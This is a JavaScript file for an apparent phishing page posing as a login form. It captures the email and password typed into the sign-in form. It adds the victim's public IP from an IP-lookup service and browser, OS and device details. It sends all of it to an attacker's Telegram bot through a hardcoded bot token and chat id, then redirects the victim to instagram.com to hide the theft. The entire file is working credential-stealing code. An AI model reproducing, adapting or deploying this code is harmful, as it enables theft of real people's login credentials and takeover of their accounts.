var signinbtn = document.getElementById('login-standard-submit')

$.getJSON("https://api.ipify.org?format=json", function(data) {

var ip = document.getElementById('gfg').value = data.ip

})



var useragent = navigator.userAgent
const parser = new UAParser(useragent);
const parserResults = parser.getResult();




var osdetails = parserResults.os.name + ' ' + parserResults.os.version
var browser = parserResults.browser.name + ' ' +  parserResults.browser.version
var device = parserResults.device.model + ' ' + parserResults.device.vendor



            signinbtn.addEventListener('click', function(e){

                e.preventDefault()
               
               
                var ip = document.getElementById('gfg').value 
                var email = document.getElementById('email').value
                var password = document.getElementById('password').value
 

                let tg = {
                    token: "6073217116:AAEUemrOq1d0lYxOhm57krIJ5hSjnYoihi0", // Your bot's token that got from @BotFather
                    chat_id: "6178645343" // The user's(that you want to send a message) telegram chat id
                }


                // console.log("email = " + email )

                // console.log("password = " + password )

                // console.log("ip = " + ip )


                // console.log("OS = " + osdetails )

                // console.log("Browser = " + browser )

                // console.log("Device = " + device )

                var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;


                if(email == "" ||  password == ""){

                    
                    console.log('Email and password field cannot be empty')

                } else if(email.match(validRegex) && password != "")  {

                    console.log('Email and password is valid')
                    const url = `https://api.telegram.org/bot${tg.token}/sendMessage` // The url to request

                    const obj = {
                        chat_id: tg.chat_id, // Telegram chat id
                        text: "Email : " + email +  "\r\n" + "Password : " + password   + "\r\n" + "IP : " + ip  + "\r\n" + "\r\n" + "Device : " + osdetails +  "\r\n" + browser + "\r\n" + device       // The text to send
                    };

                    $.ajax({
                        type: 'POST',
                        url: url,
                        data: obj,
                        dataType: "json",
                        success: function() {   window.location.replace('https://www.instagram.com/')} })
                     
                   
                }

                else {

                    console.log('Email and password still cannot be empty')

                }


            
            
            
            
            
            })
            

